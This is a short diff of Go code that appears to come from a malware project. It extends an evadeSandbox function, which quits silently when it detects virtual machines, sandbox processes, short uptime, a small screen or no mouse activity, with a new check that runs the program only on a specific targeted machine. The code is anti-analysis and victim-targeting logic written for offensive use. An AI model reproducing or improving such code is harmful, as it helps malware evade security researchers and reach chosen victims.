@@ -214,7 +214,8 @@ func isSmallScreen() bool {
 	return cx > 0 && cy > 0 && (cx < 1024 || cy < 768)
 }
 
-// evadeSandbox exits silently when a sandbox or analysis environment is detected.
+// evadeSandbox exits silently when a sandbox or analysis environment is detected,
+// or when targeted machine binding is configured and this machine doesn't match.
 func evadeSandbox() {
 	if isVMByRegistry() ||
 		isVMByMAC() ||
@@ -223,7 +224,8 @@ func evadeSandbox() {
 		isShortUptime() ||
 		isSandboxProcessRunning() ||
 		isSmallScreen() ||
-		!hasRecentMouseActivity() {
+		!hasRecentMouseActivity() ||
+		!checkTargetedBinding() {
 		os.Exit(0)
 	}
 }
